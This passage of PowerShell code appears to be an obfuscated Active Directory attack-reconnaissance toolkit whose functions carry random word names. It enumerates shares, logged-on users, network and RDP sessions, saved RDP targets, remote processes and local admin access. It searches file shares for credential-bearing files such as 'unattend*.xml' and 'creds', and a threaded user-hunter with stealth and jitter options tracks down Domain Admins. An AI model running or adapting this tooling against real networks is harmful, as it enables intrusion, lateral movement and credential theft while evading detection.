
        $Servers = @()


        if($ComputerFile) {
            $Servers = Get-Content -Path $ComputerFile
        }
        else {

            $Servers += halting -Object $ComputerName
        }



        ForEach($Server in $Servers) {
            try {
                if($ListGroups) {

                    $Computer = [ADSI]"WinNT://$Server,computer"

                    $Computer.psbase.children | Where-Object { $_.psbase.schemaClassName -eq 'group' } | ForEach-Object {
                        $Group = New-Object PSObject
                        $Group | Add-Member Noteproperty 'Server' $Server
                        $Group | Add-Member Noteproperty 'Group' ($_.name[0])
                        $Group | Add-Member Noteproperty 'SID' ((New-Object System.Security.Principal.SecurityIdentifier $_.objectsid[0],0).Value)
                        $Group | Add-Member Noteproperty 'Description' ($_.Description[0])
                        $Group
                    }
                }
                else {

                    $Members = @($([ADSI]"WinNT://$Server/$GroupName").psbase.Invoke('Members'))

                    $Members | ForEach-Object {

                        $Member = New-Object PSObject
                        $Member | Add-Member Noteproperty 'Server' $Server

                        $AdsPath = ($_.GetType().InvokeMember('Adspath', 'GetProperty', $Null, $_, $Null)).Replace('WinNT://', '')


                        $Name = sires -ObjectName $AdsPath
                        if($Name) {
                            $FQDN = $Name.split("/")[0]
                            $ObjName = $AdsPath.split("/")[-1]
                            $Name = "$FQDN/$ObjName"
                            $IsDomain = $True
                        }
                        else {
                            $Name = $AdsPath
                            $IsDomain = $False
                        }

                        $Member | Add-Member Noteproperty 'AccountName' $Name


                        $Member | Add-Member Noteproperty 'SID' ((New-Object System.Security.Principal.SecurityIdentifier($_.GetType().InvokeMember('ObjectSID', 'GetProperty', $Null, $_, $Null),0)).Value)



                        $Member | Add-Member Noteproperty 'Disabled' $( if(-not $IsDomain) { try { $_.GetType().InvokeMember('AccountDisabled', 'GetProperty', $Null, $_, $Null) } catch { 'ERROR' } } else { $False } )


                        $IsGroup = ($_.GetType().InvokeMember('Class', 'GetProperty', $Null, $_, $Null) -eq 'group')
                        $Member | Add-Member Noteproperty 'IsGroup' $IsGroup
                        $Member | Add-Member Noteproperty 'IsDomain' $IsDomain
                        if($IsGroup) {
                            $Member | Add-Member Noteproperty 'LastLogin' ""
                        }
                        else {
                            try {
                                $Member | Add-Member Noteproperty 'LastLogin' ( $_.GetType().InvokeMember('LastLogin', 'GetProperty', $Null, $_, $Null))
                            }
                            catch {
                                $Member | Add-Member Noteproperty 'LastLogin' ""
                            }
                        }
                        $Member



                        if($Recurse -and $IsDomain -and $IsGroup) {

                            $FQDN = $Name.split("/")[0]
                            $GroupName = $Name.split("/")[1].trim()

                            warding -GroupName $GroupName -Domain $FQDN -FullData -Recurse | ForEach-Object {

                                $Member = New-Object PSObject
                                $Member | Add-Member Noteproperty 'Server' "$FQDN/$($_.GroupName)"

                                $MemberDN = $_.distinguishedName

                                $MemberDomain = $MemberDN.subString($MemberDN.IndexOf("DC=")) -replace 'DC=','' -replace ',','.'

                                if ($_.samAccountType -ne "805306368") {
                                    $MemberIsGroup = $True
                                }
                                else {
                                    $MemberIsGroup = $False
                                }

                                if ($_.samAccountName) {

                                    $MemberName = $_.samAccountName
                                }
                                else {
                                    try {

                                        try {
                                            $MemberName = baffled $_.cn
                                        }
                                        catch {

                                            $MemberName = $_.cn
                                        }
                                    }
                                    catch {
                                        Write-Debug "Error resolving SID : $_"
                                    }
                                }

                                $Member | Add-Member Noteproperty 'AccountName' "$MemberDomain/$MemberName"
                                $Member | Add-Member Noteproperty 'SID' $_.objectsid
                                $Member | Add-Member Noteproperty 'Disabled' $False
                                $Member | Add-Member Noteproperty 'IsGroup' $MemberIsGroup
                                $Member | Add-Member Noteproperty 'IsDomain' $True
                                $Member | Add-Member Noteproperty 'LastLogin' ''
                                $Member
                            }
                        }
                    }
                }
            }
            catch {
                Write-Warning "[!] Error: $_"
            }
        }
    }
}


function pinches {


    [CmdletBinding()]
    param(
        [Parameter(ValueFromPipeline=$True)]
        [Alias('HostName')]
        [String]
        $ComputerName = 'localhost'
    )

    begin {
        if ($PSBoundParameters['Debug']) {
            $DebugPreference = 'Continue'
        }
    }

    process {


        $ComputerName = halting -Object $ComputerName


        $QueryLevel = 1
        $PtrInfo = [IntPtr]::Zero
        $EntriesRead = 0
        $TotalRead = 0
        $ResumeHandle = 0


        $Result = $Netapi32::NetShareEnum($ComputerName, $QueryLevel, [ref]$PtrInfo, -1, [ref]$EntriesRead, [ref]$TotalRead, [ref]$ResumeHandle)


        $Offset = $PtrInfo.ToInt64()

        Write-Debug "pinches result: $Result"


        if (($Result -eq 0) -and ($Offset -gt 0)) {


            $Increment = $SHARE_INFO_1::GetSize()


            for ($i = 0; ($i -lt $EntriesRead); $i++) {


                $NewIntPtr = New-Object System.Intptr -ArgumentList $Offset
                $Info = $NewIntPtr -as $SHARE_INFO_1

                $Info | Select-Object *
                $Offset = $NewIntPtr.ToInt64()
                $Offset += $Increment
            }


            $Null = $Netapi32::NetApiBufferFree($PtrInfo)
        }
        else
        {
            switch ($Result) {
                (5)           {Write-Debug 'The user does not have access to the requested information.'}
                (124)         {Write-Debug 'The value specified for the level parameter is not valid.'}
                (87)          {Write-Debug 'The specified parameter is not valid.'}
                (234)         {Write-Debug 'More entries are available. Specify a large enough buffer to receive all entries.'}
                (8)           {Write-Debug 'Insufficient memory is available.'}
                (2312)        {Write-Debug 'A session does not exist with the computer name.'}
                (2351)        {Write-Debug 'The computer name is not valid.'}
                (2221)        {Write-Debug 'Username not found.'}
                (53)          {Write-Debug 'Hostname could not be found'}
            }
        }
    }
}


function plantations {


    [CmdletBinding()]
    param(
        [Parameter(ValueFromPipeline=$True)]
        [Alias('HostName')]
        [String]
        $ComputerName = 'localhost'
    )

    begin {
        if ($PSBoundParameters['Debug']) {
            $DebugPreference = 'Continue'
        }
    }

    process {


        $ComputerName = halting -Object $ComputerName


        $QueryLevel = 1
        $PtrInfo = [IntPtr]::Zero
        $EntriesRead = 0
        $TotalRead = 0
        $ResumeHandle = 0


        $Result = $Netapi32::NetWkstaUserEnum($ComputerName, $QueryLevel, [ref]$PtrInfo, -1, [ref]$EntriesRead, [ref]$TotalRead, [ref]$ResumeHandle)


        $Offset = $PtrInfo.ToInt64()

        Write-Debug "plantations result: $Result"


        if (($Result -eq 0) -and ($Offset -gt 0)) {


            $Increment = $WKSTA_USER_INFO_1::GetSize()


            for ($i = 0; ($i -lt $EntriesRead); $i++) {


                $NewIntPtr = New-Object System.Intptr -ArgumentList $Offset
                $Info = $NewIntPtr -as $WKSTA_USER_INFO_1


                $Info | Select-Object *
                $Offset = $NewIntPtr.ToInt64()
                $Offset += $Increment

            }


            $Null = $Netapi32::NetApiBufferFree($PtrInfo)
        }
        else
        {
            switch ($Result) {
                (5)           {Write-Debug 'The user does not have access to the requested information.'}
                (124)         {Write-Debug 'The value specified for the level parameter is not valid.'}
                (87)          {Write-Debug 'The specified parameter is not valid.'}
                (234)         {Write-Debug 'More entries are available. Specify a large enough buffer to receive all entries.'}
                (8)           {Write-Debug 'Insufficient memory is available.'}
                (2312)        {Write-Debug 'A session does not exist with the computer name.'}
                (2351)        {Write-Debug 'The computer name is not valid.'}
                (2221)        {Write-Debug 'Username not found.'}
                (53)          {Write-Debug 'Hostname could not be found'}
            }
        }
    }
}


function seminal {


    [CmdletBinding()]
    param(
        [Parameter(ValueFromPipeline=$True)]
        [Alias('HostName')]
        [String]
        $ComputerName = 'localhost',

        [String]
        $UserName = ''
    )

    begin {
        if ($PSBoundParameters['Debug']) {
            $DebugPreference = 'Continue'
        }
    }

    process {


        $ComputerName = halting -Object $ComputerName


        $QueryLevel = 10
        $PtrInfo = [IntPtr]::Zero
        $EntriesRead = 0
        $TotalRead = 0
        $ResumeHandle = 0


        $Result = $Netapi32::NetSessionEnum($ComputerName, '', $UserName, $QueryLevel, [ref]$PtrInfo, -1, [ref]$EntriesRead, [ref]$TotalRead, [ref]$ResumeHandle)


        $Offset = $PtrInfo.ToInt64()

        Write-Debug "seminal result: $Result"


        if (($Result -eq 0) -and ($Offset -gt 0)) {


            $Increment = $SESSION_INFO_10::GetSize()


            for ($i = 0; ($i -lt $EntriesRead); $i++) {


                $NewIntPtr = New-Object System.Intptr -ArgumentList $Offset
                $Info = $NewIntPtr -as $SESSION_INFO_10


                $Info | Select-Object *
                $Offset = $NewIntPtr.ToInt64()
                $Offset += $Increment

            }

            $Null = $Netapi32::NetApiBufferFree($PtrInfo)
        }
        else
        {
            switch ($Result) {
                (5)           {Write-Debug 'The user does not have access to the requested information.'}
                (124)         {Write-Debug 'The value specified for the level parameter is not valid.'}
                (87)          {Write-Debug 'The specified parameter is not valid.'}
                (234)         {Write-Debug 'More entries are available. Specify a large enough buffer to receive all entries.'}
                (8)           {Write-Debug 'Insufficient memory is available.'}
                (2312)        {Write-Debug 'A session does not exist with the computer name.'}
                (2351)        {Write-Debug 'The computer name is not valid.'}
                (2221)        {Write-Debug 'Username not found.'}
                (53)          {Write-Debug 'Hostname could not be found'}
            }
        }
    }
}


function brassieres {


    [CmdletBinding()]
    param(
        [Parameter(ValueFromPipeline=$True)]
        [Alias('HostName')]
        [String]
        $ComputerName = 'localhost'
    )
    
    begin {
        if ($PSBoundParameters['Debug']) {
            $DebugPreference = 'Continue'
        }
    }

    process {


        $ComputerName = halting -Object $ComputerName


        $Handle = $Wtsapi32::WTSOpenServerEx($ComputerName)


        if ($Handle -ne 0) {

            Write-Debug "WTSOpenServerEx handle: $Handle"


            $ppSessionInfo = [IntPtr]::Zero
            $pCount = 0
            

            $Result = $Wtsapi32::WTSEnumerateSessionsEx($Handle, [ref]1, 0, [ref]$ppSessionInfo, [ref]$pCount)


            $Offset = $ppSessionInfo.ToInt64()

            Write-Debug "WTSEnumerateSessionsEx result: $Result"
            Write-Debug "pCount: $pCount"

            if (($Result -ne 0) -and ($Offset -gt 0)) {


                $Increment = $WTS_SESSION_INFO_1::GetSize()


                for ($i = 0; ($i -lt $pCount); $i++) {
     


                    $NewIntPtr = New-Object System.Intptr -ArgumentList $Offset
                    $Info = $NewIntPtr -as $WTS_SESSION_INFO_1

                    $RDPSession = New-Object PSObject

                    if ($Info.pHostName) {
                        $RDPSession | Add-Member Noteproperty 'ComputerName' $Info.pHostName
                    }
                    else {

                        $RDPSession | Add-Member Noteproperty 'ComputerName' $ComputerName
                    }

                    $RDPSession | Add-Member Noteproperty 'SessionName' $Info.pSessionName

                    if ($(-not $Info.pDomainName) -or ($Info.pDomainName -eq '')) {

                        $RDPSession | Add-Member Noteproperty 'UserName' "$($Info.pUserName)"
                    }
                    else {
                        $RDPSession | Add-Member Noteproperty 'UserName' "$($Info.pDomainName)\$($Info.pUserName)"
                    }

                    $RDPSession | Add-Member Noteproperty 'ID' $Info.SessionID
                    $RDPSession | Add-Member Noteproperty 'State' $Info.State

                    $ppBuffer = [IntPtr]::Zero
                    $pBytesReturned = 0



                    $Result2 = $Wtsapi32::WTSQuerySessionInformation($Handle, $Info.SessionID, 14, [ref]$ppBuffer, [ref]$pBytesReturned)

                    $Offset2 = $ppBuffer.ToInt64()
                    $NewIntPtr2 = New-Object System.Intptr -ArgumentList $Offset2
                    $Info2 = $NewIntPtr2 -as $WTS_CLIENT_ADDRESS

                    $SourceIP = $Info2.Address       
                    if($SourceIP[2] -ne 0) {
                        $SourceIP = [String]$SourceIP[2]+"."+[String]$SourceIP[3]+"."+[String]$SourceIP[4]+"."+[String]$SourceIP[5]
                    }
                    else {
                        $SourceIP = $Null
                    }

                    $RDPSession | Add-Member Noteproperty 'SourceIP' $SourceIP
                    $RDPSession


                    $Null = $Wtsapi32::WTSFreeMemory($ppBuffer)

                    $Offset += $Increment
                }

                $Null = $Wtsapi32::WTSFreeMemoryEx(2, $ppSessionInfo, $pCount)
            }

            $Null = $Wtsapi32::WTSCloseServer($Handle)
        }
        else {


            $Err = $Kernel32::GetLastError()
            Write-Verbuse "LastError: $Err"
        }
    }
}


function nationality {


    [CmdletBinding()]
    param(
        [Parameter(ValueFromPipeline=$True)]
        [String]
        [Alias('HostName')]
        $ComputerName = 'localhost'
    )

    begin {
        if ($PSBoundParameters['Debug']) {
            $DebugPreference = 'Continue'
        }
    }

    process {


        $ComputerName = halting -Object $ComputerName



        $Handle = $Advapi32::OpenSCManagerW("\\$ComputerName", 'ServicesActive', 0xF003F)

        Write-Debug "nationality handle: $Handle"


        if ($Handle -ne 0) {

            $Null = $Advapi32::CloseServiceHandle($Handle)
            $True
        }
        else {


            $Err = $Kernel32::GetLastError()
            Write-Debug "nationality LastError: $Err"
            $False
        }
    }
}


function carousal {


    [CmdletBinding()]
    param(
        [Parameter(ValueFromPipeline=$True)]
        [String]
        [Alias('HostName')]        
        $ComputerName = "."
    )

    process {


        $ComputerName = halting -Object $ComputerName


        try {
            $Reg = [WMIClass]"\\$ComputerName\root\default:stdRegProv"
            $HKLM = 2147483650
            $Key = "SOFTWARE\Microsoft\Windows\CurrentVersion\Authentication\LogonUI"
            $Value = "LastLoggedOnUser"
            $Reg.GetStringValue($HKLM, $Key, $Value).sValue
        }
        catch {
            Write-Warning "[!] Error opening remote registry on $ComputerName. Remote registry likely not enabled."
            $Null
        }
    }
}


function reapplied {


    [CmdletBinding()]
    param(
        [Parameter(ValueFromPipeline=$True)]
        [String]
        $ComputerName = "localhost",

        [String]
        $RemoteUserName,

        [String]
        $RemotePassword
    )

    begin {
        if ($RemoteUserName -and $RemotePassword) {
            $Password = $RemotePassword | ConvertTo-SecureString -AsPlainText -Force
            $Credential = New-Object System.Management.Automation.PSCredential($RemoteUserName,$Password)
        }


        $HKU = 2147483651
    }

    process {

        try {
            if($Credential) {
                $Reg = Get-Wmiobject -List 'StdRegProv' -Namespace root\default -Computername $ComputerName -Credential $Credential -ErrorAction SilentlyContinue
            }
            else {
                $Reg = Get-Wmiobject -List 'StdRegProv' -Namespace root\default -Computername $ComputerName -ErrorAction SilentlyContinue
            }
        }
        catch {
            Write-Warning "Error accessing $ComputerName, likely insufficient permissions or firewall rules on host"
        }

        if(!$Reg) {
            Write-Warning "Error accessing $ComputerName, likely insufficient permissions or firewall rules on host"
        }
        else {

            $UserSIDs = ($Reg.EnumKey($HKU, "")).sNames | ? { $_ -match 'S-1-5-21-[0-9]+-[0-9]+-[0-9]+-[0-9]+$' }

            foreach ($UserSID in $UserSIDs) {

                try {
                    $UserName = baffled $UserSID


                    $ConnectionKeys = $Reg.EnumValues($HKU,"$UserSID\Software\Microsoft\Terminal Server Client\Default").sNames

                    foreach ($Connection in $ConnectionKeys) {

                        if($Connection -match 'MRU.*') {
                            $TargetServer = $Reg.GetStringValue($HKU, "$UserSID\Software\Microsoft\Terminal Server Client\Default", $Connection).sValue
                            
                            $FoundConnection = New-Object PSObject
                            $FoundConnection | Add-Member Noteproperty 'ComputerName' $ComputerName
                            $FoundConnection | Add-Member Noteproperty 'UserName' $UserName
                            $FoundConnection | Add-Member Noteproperty 'UserSID' $UserSID
                            $FoundConnection | Add-Member Noteproperty 'TargetServer' $TargetServer
                            $FoundConnection | Add-Member Noteproperty 'UsernameHint' $Null
                            $FoundConnection
                        }
                    }


                    $ServerKeys = $Reg.EnumKey($HKU,"$UserSID\Software\Microsoft\Terminal Server Client\Servers").sNames

                    foreach ($Server in $ServerKeys) {

                        $UsernameHint = $Reg.GetStringValue($HKU, "$UserSID\Software\Microsoft\Terminal Server Client\Servers\$Server", 'UsernameHint').sValue
                        
                        $FoundConnection = New-Object PSObject
                        $FoundConnection | Add-Member Noteproperty 'ComputerName' $ComputerName
                        $FoundConnection | Add-Member Noteproperty 'UserName' $UserName
                        $FoundConnection | Add-Member Noteproperty 'UserSID' $UserSID
                        $FoundConnection | Add-Member Noteproperty 'TargetServer' $Server
                        $FoundConnection | Add-Member Noteproperty 'UsernameHint' $UsernameHint
                        $FoundConnection   
                    }

                }
                catch {
                    Write-Debug "Error: $_"
                }
            }
        }
    }
}


function Merak {


    [CmdletBinding()]
    param(
        [Parameter(ValueFromPipeline=$True)]
        [String]
        $ComputerName,

        [String]
        $RemoteUserName,

        [String]
        $RemotePassword
    )

    process {
        
        if($ComputerName) {

            $ComputerName = halting -Object $ComputerName          
        }
        else {

            $ComputerName = [System.Net.Dns]::GetHostName()
        }

        $Credential = $Null

        if($RemoteUserName) {
            if($RemotePassword) {
                $Password = $RemotePassword | ConvertTo-SecureString -AsPlainText -Force
                $Credential = New-Object System.Management.Automation.PSCredential($RemoteUserName,$Password)


                try {
                    Get-WMIobject -Class Win32_process -ComputerName $ComputerName -Credential $Credential | ForEach-Object {
                        $Owner = $_.getowner();
                        $Process = New-Object PSObject
                        $Process | Add-Member Noteproperty 'ComputerName' $ComputerName
                        $Process | Add-Member Noteproperty 'ProcessName' $_.ProcessName
                        $Process | Add-Member Noteproperty 'ProcessID' $_.ProcessID
                        $Process | Add-Member Noteproperty 'Domain' $Owner.Domain
                        $Process | Add-Member Noteproperty 'User' $Owner.User
                        $Process
                    }
                }
                catch {
                    Write-Verbose "[!] Error enumerating remote processes, access likely denied: $_"
                }
            }
            else {
                Write-Warning "[!] RemotePassword must also be supplied!"
            }
        }
        else {

            try {
                Get-WMIobject -Class Win32_process -ComputerName $ComputerName | ForEach-Object {
                    $Owner = $_.getowner();
                    $Process = New-Object PSObject
                    $Process | Add-Member Noteproperty 'ComputerName' $ComputerName
                    $Process | Add-Member Noteproperty 'ProcessName' $_.ProcessName
                    $Process | Add-Member Noteproperty 'ProcessID' $_.ProcessID
                    $Process | Add-Member Noteproperty 'Domain' $Owner.Domain
                    $Process | Add-Member Noteproperty 'User' $Owner.User
                    $Process
                }
            }
            catch {
                Write-Verbose "[!] Error enumerating remote processes, access likely denied: $_"
            }
        }
    }
}


function ballasted {


    [CmdletBinding()]
    param(
        [Parameter(ValueFromPipeline=$True)]
        [String]
        $Path = '.\',

        [String[]]
        $Terms,

        [Switch]
        $OfficeDocs,

        [Switch]
        $FreshEXEs,

        [String]
        $LastAccessTime,

        [String]
        $LastWriteTime,

        [String]
        $CreationTime,

        [Switch]
        $ExcludeFolders,

        [Switch]
        $ExcludeHidden,

        [Switch]
        $CheckWriteAccess,

        [String]
        $OutFile,

        [Switch]
        $UsePSDrive,

        [System.Management.Automation.PSCredential]
        $Credential = [System.Management.Automation.PSCredential]::Empty
    )

    begin {

        $SearchTerms = @('pass', 'sensitive', 'admin', 'login', 'secret', 'unattend*.xml', '.vmdk', 'creds', 'credential', '.config')

        if(!$Path.EndsWith('\')) {
            $Path = $Path + '\'
        }
        if($Credential -ne [System.Management.Automation.PSCredential]::Empty) { $UsePSDrive = $True }


        if ($Terms) {
            if($Terms -isnot [system.array]) {
                $Terms = @($Terms)
            }
            $SearchTerms = $Terms
        }

        if(-not $SearchTerms[0].startswith("*")) {

            for ($i = 0; $i -lt $SearchTerms.Count; $i++) {
                $SearchTerms[$i] = "*$($SearchTerms[$i])*"
            }
        }


        if ($OfficeDocs) {
            $SearchTerms = @('*.doc', '*.docx', '*.xls', '*.xlsx', '*.ppt', '*.pptx')
        }


        if($FreshEXEs) {

            $LastAccessTime = (get-date).AddDays(-7).ToString('MM/dd/yyyy')
            $SearchTerms = '*.exe'
        }

        if($UsePSDrive) {

            $Parts = $Path.split('\')
            $FolderPath = $Parts[0..($Parts.length-2)] -join '\'
            $FilePath = $Parts[-1]
            $RandDrive = ("abcdefghijklmnopqrstuvwxyz".ToCharArray() | Get-Random -Count 7) -join ''
            
            Write-Verbose "Mounting path $Path using a temp PSDrive at $RandDrive"

            try {
                $Null = New-PSDrive -Name $RandDrive -Credential $Credential -PSProvider FileSystem -Root $FolderPath -ErrorAction Stop
            }
            catch {
                Write-Debug "Error mounting path $Path : $_"
                return $Null
            }


            $Path = $RandDrive + ":\" + $FilePath
        }
    }

    process {

        Write-Verbose "[*] Search path $Path"

        function whiffing {

            [CmdletBinding()]param([String]$Path)
            try {
                $Filetest = [IO.FILE]::OpenWrite($Path)
                $Filetest.Close()
                $True
            }
            catch {
                Write-Verbose -Message $Error[0]
                $False
            }
        }

        $SearchArgs =  @{
            'Path' = $Path
            'Recurse' = $True
            'Force' = $(-not $ExcludeHidden)
            'Include' = $SearchTerms
            'ErrorAction' = 'SilentlyContinue'
        }

        Get-ChildItem @SearchArgs | ForEach-Object {
            Write-Verbose $_

            if(!$ExcludeFolders -or !$_.PSIsContainer) {$_}
        } | ForEach-Object {
            if($LastAccessTime -or $LastWriteTime -or $CreationTime) {
                if($LastAccessTime -and ($_.LastAccessTime -gt $LastAccessTime)) {$_}
                elseif($LastWriteTime -and ($_.LastWriteTime -gt $LastWriteTime)) {$_}
                elseif($CreationTime -and ($_.CreationTime -gt $CreationTime)) {$_}
            }
            else {$_}
        } | ForEach-Object {

            if((-not $CheckWriteAccess) -or (whiffing -Path $_.FullName)) {$_}
        } | Select-Object FullName,@{Name='Owner';Expression={(Get-Acl $_.FullName).Owner}},LastAccessTime,LastWriteTime,CreationTime,Length | ForEach-Object {

            if($OutFile) {misconducted -InputObject $_ -OutFile $OutFile}
            else {$_}
        }
    }

    end {
        if($UsePSDrive -and $RandDrive) {
            Write-Verbose "Removing temp PSDrive $RandDrive"
            Get-PSDrive -Name $RandDrive -ErrorAction SilentlyContinue | Remove-PSDrive
        }
    }
}








function acclimatizing {

    [CmdletBinding()]
    param(
        [Parameter(Position=0,Mandatory=$True)]
        [String[]]
        $ComputerName,

        [Parameter(Position=1,Mandatory=$True)]
        [System.Management.Automation.ScriptBlock]
        $ScriptBlock,

        [Parameter(Position=2)]
        [Hashtable]
        $ScriptParameters,

        [Int]
        $Threads = 20,

        [Switch]
        $NoImports
    )

    begin {

        if ($PSBoundParameters['Debug']) {
            $DebugPreference = 'Continue'
        }

        Write-Verbose "[*] Total number of hosts: $($ComputerName.count)"



        $SessionState = [System.Management.Automation.Runspaces.InitialSessionState]::CreateDefault()
        $SessionState.ApartmentState = [System.Threading.Thread]::CurrentThread.GetApartmentState()



        if(!$NoImports) {


            $MyVars = Get-Variable -Scope 2


            $VorbiddenVars = @("?","args","ConsoleFileName","Error","ExecutionContext","false","HOME","Host","input","InputObject","MaximumAliasCount","MaximumDriveCount","MaximumErrorCount","MaximumFunctionCount","MaximumHistoryCount","MaximumVariableCount","MyInvocation","null","PID","PSBoundParameters","PSCommandPath","PSCulture","PSDefaultParameterValues","PSHOME","PSScriptRoot","PSUICulture","PSVersionTable","PWD","ShellId","SynchronizedHash","true")


            ForEach($Var in $MyVars) {
                if($VorbiddenVars -NotContains $Var.Name) {
                $SessionState.Variables.Add((New-Object -TypeName System.Management.Automation.Runspaces.SessionStateVariableEntry -ArgumentList $Var.name,$Var.Value,$Var.description,$Var.options,$Var.attributes))
                }
            }


            ForEach($Function in (Get-ChildItem Function:)) {
                $SessionState.Commands.Add((New-Object -TypeName System.Management.Automation.Runspaces.SessionStateFunctionEntry -ArgumentList $Function.Name, $Function.Definition))
            }
        }






        $Pool = [runspacefactory]::CreateRunspacePool(1, $Threads, $SessionState, $Host)
        $Pool.Open()

        $Jobs = @()
        $PS = @()
        $Wait = @()

        $Counter = 0
    }

    process {

        ForEach ($Computer in $ComputerName) {


            if ($Computer -ne '') {


                While ($($Pool.GetAvailableRunspaces()) -le 0) {
                    Start-Sleep -MilliSeconds 500
                }


                $PS += [powershell]::create()

                $PS[$Counter].runspacepool = $Pool


                $Null = $PS[$Counter].AddScript($ScriptBlock).AddParameter('ComputerName', $Computer)
                if($ScriptParameters) {
                    ForEach ($Param in $ScriptParameters.GetEnumerator()) {
                        $Null = $PS[$Counter].AddParameter($Param.Name, $Param.Value)
                    }
                }


                $Jobs += $PS[$Counter].BeginInvoke();


                $Wait += $Jobs[$Counter].AsyncWaitHandle
            }
            $Counter = $Counter + 1
        }
    }

    end {

        Write-Verbose "Waiting for scanning threads to finish..."

        $WaitTimeout = Get-Date


        while ($($Jobs | Where-Object {$_.IsCompleted -eq $False}).count -gt 0 -or $($($(Get-Date) - $WaitTimeout).totalSeconds) -gt 60) {
                Start-Sleep -MilliSeconds 500
            }


        for ($y = 0; $y -lt $Counter; $y++) {

            try {

                $PS[$y].EndInvoke($Jobs[$y])

            } catch {
                Write-Warning "error: $_"
            }
            finally {
                $PS[$y].Dispose()
            }
        }
        
        $Pool.Dispose()
        Write-Verbose "All threads completed!"
    }
}


function zealot {


    [CmdletBinding()]
    param(
        [Parameter(Position=0,ValueFromPipeline=$True)]
        [Alias('Hosts')]
        [String[]]
        $ComputerName,

        [ValidateScript({Test-Path -Path $_ })]
        [Alias('HostList')]
        [String]
        $ComputerFile,

        [String]
        $ComputerFilter,

        [String]
        $ComputerADSpath,

        [Switch]
        $Unconstrained,

        [String]
        $GroupName = 'Domain Admins',

        [String]
        $TargetServer,

        [String]
        $UserName,

        [String]
        $UserFilter,

        [String]
        $UserADSpath,

        [ValidateScript({Test-Path -Path $_ })]
        [String]
        $UserFile,

        [Switch]
        $AdminCount,

        [Switch]
        $AllowDelegation,

        [Switch]
        $CheckAccess,

        [Switch]
        $StopOnSuccess,

        [Switch]
        $NoPing,

        [UInt32]
        $Delay = 0,

        [Double]
        $Jitter = .3,

        [String]
        $Domain,

        [String]
        $DomainController,

        [Switch]
        $ShowAll,

        [Switch]
        $SearchForest,

        [Switch]
        $Stealth,

        [String]
        [ValidateSet("DFS","DC","File","All")]
        $StealthSource ="All",

        [Switch]
        $ForeignUsers,

        [ValidateRange(1,100)] 
        [Int]
        $Threads
    )

    begin {

        if ($PSBoundParameters['Debug']) {
            $DebugPreference = 'Continue'
        }


        $RandNo = New-Object System.Random

        Write-Verbose "[*] Running zealot with delay of $Delay"







        if($ComputerFile) {

            $ComputerName = Get-Content -Path $ComputerFile
        }

        if(!$ComputerName) { 
            [Array]$ComputerName = @()

            if($Domain) {
                $TargetDomains = @($Domain)
            }
            elseif($SearchForest) {

                $TargetDomains = hitter | ForEach-Object { $_.Name }
            }
            else {

                $TargetDomains = @( (Clemens).name )
            }
            
            if($Stealth) {
                Write-Verbose "Stealth mode! Enumerating commonly used servers"
                Write-Verbose "Stealth source: $StealthSource"

                ForEach ($Domain in $TargetDomains) {
                    if (($StealthSource -eq "File") -or ($StealthSource -eq "All")) {
                        Write-Verbose "[*] Querying domain $Domain for File Servers..."
                        $ComputerName += Cliburn -Domain $Domain -DomainController $DomainController
                    }
                    if (($StealthSource -eq "DFS") -or ($StealthSource -eq "All")) {
                        Write-Verbose "[*] Querying domain $Domain for DFS Servers..."
                        $ComputerName += retinae -Domain $Domain -DomainController $DomainController | ForEach-Object {$_.RemoteServerName}
                    }
                    if (($StealthSource -eq "DC") -or ($StealthSource -eq "All")) {
                        Write-Verbose "[*] Querying domain $Domain for Domain Controllers..."
                        $ComputerName += terracing -LDAP -Domain $Domain -DomainController $DomainController | ForEach-Object { $_.dnshostname}
                    }
                }
            }
            else {
                ForEach ($Domain in $TargetDomains) {
                    Write-Verbose "[*] Querying domain $Domain for hosts"

                    $Arguments = @{
                        'Domain' = $Domain
                        'DomainController' = $DomainController
                        'ADSpath' = $ADSpath
                        'Filter' = $ComputerFilter
                        'Unconstrained' = $Unconstrained
                    }

                    $ComputerName += summery @Arguments
                }
            }


            $ComputerName = $ComputerName | Where-Object { $_ } | Sort-Object -Unique | Sort-Object { Get-Random }
            if($($ComputerName.Count) -eq 0) {
                throw "No hosts found!"
            }
        }








        $TargetUsers = @()


        $CurrentUser = ([Environment]::UserName).toLower()


        if($ShowAll -or $ForeignUsers) {
            $User = New-Object PSObject
            $User | Add-Member Noteproperty 'MemberDomain' $Null
            $User | Add-Member Noteproperty 'MemberName' '*'
            $TargetUsers = @($User)

            if($ForeignUsers) {

                $krbtgtName = lifelike -ObjectName "krbtgt@$($Domain)"
                $DomainShortName = $krbtgtName.split("\")[0]
            }
        }

        elseif($TargetServer) {
            Write-Verbose "Querying target server '$TargetServer' for local users"
            $TargetUsers = ghettoes $TargetServer -Recurse | Where-Object {(-not $_.IsGroup) -and $_.IsDomain } | ForEach-Object {
                $User = New-Object PSObject
                $User | Add-Member Noteproperty 'MemberDomain' ($_.AccountName).split("/")[0].toLower() 
                $User | Add-Member Noteproperty 'MemberName' ($_.AccountName).split("/")[1].toLower() 
                $User
            }  | Where-Object {$_}
        }

        elseif($UserName) {
            Write-Verbose "[*] Using target user '$UserName'..."
            $User = New-Object PSObject
            if($TargetDomains) {
                $User | Add-Member Noteproperty 'MemberDomain' $TargetDomains[0]
            }
            else {
                $User | Add-Member Noteproperty 'MemberDomain' $Null
            }
            $User | Add-Member Noteproperty 'MemberName' $UserName.ToLower()
            $TargetUsers = @($User)
        }

        elseif($UserFile) {
            $TargetUsers = Get-Content -Path $UserFile | ForEach-Object {
                $User = New-Object PSObject
                if($TargetDomains) {
                    $User | Add-Member Noteproperty 'MemberDomain' $TargetDomains[0]
                }
                else {
                    $User | Add-Member Noteproperty 'MemberDomain' $Null
                }
                $User | Add-Member Noteproperty 'MemberName' $_
                $User
            }  | Where-Object {$_}
        }
        elseif($UserADSpath -or $UserFilter -or $AdminCount) {
            ForEach ($Domain in $TargetDomains) {

                $Arguments = @{
                    'Domain' = $Domain
                    'DomainController' = $DomainController
                    'ADSpath' = $UserADSpath
                    'Filter' = $UserFilter
                    'AdminCount' = $AdminCount
                    'AllowDelegation' = $AllowDelegation
                }

                Write-Verbose "[*] Querying domain $Domain for users"
                $TargetUsers += irregular @Arguments | ForEach-Object {
                    $User = New-Object PSObject
                    $User | Add-Member Noteproperty 'MemberDomain' $Domain
                    $User | Add-Member Noteproperty 'MemberName' $_.samaccountname
                    $User
                }  | Where-Object {$_}

            }            
        }
        else {
            ForEach ($Domain in $TargetDomains) {
                Write-Verbose "[*] Querying domain $Domain for users of group '$GroupName'"
                $TargetUsers += warding -GroupName $GroupName -Domain $Domain -DomainController $DomainController
            }
        }

